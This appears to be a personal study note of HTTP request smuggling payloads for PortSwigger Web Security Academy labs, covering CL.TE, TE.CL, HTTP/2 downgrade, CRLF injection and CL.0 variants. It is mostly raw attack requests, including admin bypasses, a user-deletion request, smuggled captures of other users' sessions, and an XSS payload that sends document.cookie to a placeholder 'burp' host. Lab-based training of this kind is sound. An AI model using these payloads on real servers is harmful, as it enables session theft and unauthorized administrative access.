![[Pasted image 20260602100238.png]]
```
CL.TE >> 
	- Front-End (CL):Processes the request based on the `Content-Length` header.
	- Back-End (TE): Processes the request based on the `Transfer-Encoding` header.
	  
TE.CL
	- Front-End (TE): Processes the request based on the `Transfer-Encoding` header.
	- Back-End (CL): Processes the request based on the `Content-Length` header.
```

``Capture other request
![[Pasted image 20260609104345.png]]
```
POST / HTTP/1.1
Host: YOUR-ID-web
Content-Length: 269
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=DdKdGHnaN1dbZGGhRw5CojHDdGTWq7pa
Content-Length: 950
Content-Type: application/x-www-form-urlencoded

csrf=myQ2m32wSi7EYGQIYjIRyoysu6FA2TND&postId=2&name=test1&email=carlos1%40normal-user.net&website=&comment====>
```

``SmugglingwithXSS CL.TE CL 0-x.\r\nx=x
![[Pasted image 20260609110753.png]] send twice
```
POST / HTTP/1.1 
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 186
Transfer-Encoding: chunked 

0 

GET /post?postId=5 HTTP/1.1 
User-Agent: a"/><script>fetch(`https://burp/?cookie=`+btoa(document.cookie));</script> 
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=x
```
**Bypass admin with CL.TE vuln
```
POST / HTTP/1.1
Host: YOUR-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
**Bypass admin with TE.CL vuln (\r\n\r\n) group
```
POST / HTTP/1.1
Host: 0afa00fb031a04e880183541002e00fa.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

50
GET /admin/delete?username=carlos HTTP/1.1
HOST: localhost
Content-Length: 6

0


```
**rewrite (search) one tab CL:TE
```getX-*-IP
POST / HTTP/1.1
Host: 0a0900cd03faf84c838c6aa4006a003d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Contection: close

	search=test
```
```
POST / HTTP/1.1
Host: YOUR-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 145

0

POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-XcGXJm-Ip: 127.0.0.1
Content-length: 200
Contection: close

x=1
```
**HTTP2.TE capture administrator account
```
POST / HTTP/2
Host: 0a6200c004904fbf80d07bcb009b0080.web-security-academy.net
Cookie: session=bAyd5WTuOYM4KhmbpIF6jVBxBKIq7tiP
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 91

0

GET /404 HTTP/1.1
Host: 0a6200c004904fbf80d07bcb009b0080.web-security-academy.net
\r\n
\r\n
```
```
We sent the request to the Burp Intruder.
- null payload -> continue indefinitely
- resource pool -> maximum concurrent 1 -> delay between requests 800
- settings -> disable CL update
- filter -> 3xx
```
**H2.CL request smuggling(Can use Intruder same H2.TE)
```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1
```
```
/resources
alert(document.cookie)
fetch(`https://burp/?cookie=`+btoa(document.cookie));
```
![[Pasted image 20260610091857.png]]
![[Pasted image 20260610092729.png]]
![[Pasted image 20260610092751.png]]

**H2 request via CRLF injection
```
[BSCP-EXAM-GUIDE-BY-N3OARI-2026/01-All-Topics/HTTP-Request-Smuggling/HTTP2-CRLF.md at main · n3oari/BSCP-EXAM-GUIDE-BY-N3OARI-2026](https://github.com/n3oari/BSCP-EXAM-GUIDE-BY-N3OARI-2026/blob/main/01-All-Topics/HTTP-Request-Smuggling/HTTP2-CRLF.md)
```
```
	-Request Header: Name=Foo
						Value:bar\r\ntRANSFER-ENCODING: chunked
```
```
0

POST / HTTP/1.1
Host: YOUR-ID.web-security-academy.net
Cookie:session=VVNXmTWubLyaEPgimAzRMx36eSQA9h5R;
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000

search===>
```
search 1 click and reload website (wait 15 sec.) got session

**H2 request splitting via CRLF injection
```Example
POST / HTTP/2
Host: YOUR-ID.web-security-academy.net
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

0

GET /404 HTTP/1.1
X: x
```
![[Pasted image 20260608151941.png]] wait 5 sec grep admin session
**CL0 Request
```
POST /resources/images/blog.svg HTTP/1.1
Host: 0a6000fe04490b70803fd12800f100dc.web-security-academy.net
Connection: keep-alive
Content-Length: 32

GET /admin HTTP/1.1
X-Ignore: x

GET / HTTP/1.1
Host: 0a6000fe04490b70803fd12800f100dc.web-security-academy.net
Cookie: session=Otsv2ct3wpbrpA3xBMeKsRxDYVTjitsH
Content-Length: 2
```
![[Pasted image 20260608155832.png]]![[Pasted image 20260608155850.png]]
**Basic CL.TE vuln
```
POST / HTTP/1.1
Host: 0ae70057045bf1b38082d06e00da007a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Transfer-Encoding: chunked

0

G
```
![[Pasted image 20260608161942.png]]send twice request
**Basic TE.CL vuln Define
```atk req
POST / HTTP/1.1
Host: 0adf0002047b817780995d1c00be00c3.web-security-academy.net
Cookie: session=gTqwjqlr7yAyDujWMTsk35z3EBxihOF9
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

1
G
0


```
```normalreq
POST / HTTP/1.1
Host: 0adf0002047b817780995d1c00be00c3.web-security-academy.net
Cookie: session=gTqwjqlr7yAyDujWMTsk35z3EBxihOF9
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

foo=bar
```
**Obfuscating TE header 
![[Pasted image 20260609101946.png]]
send twice
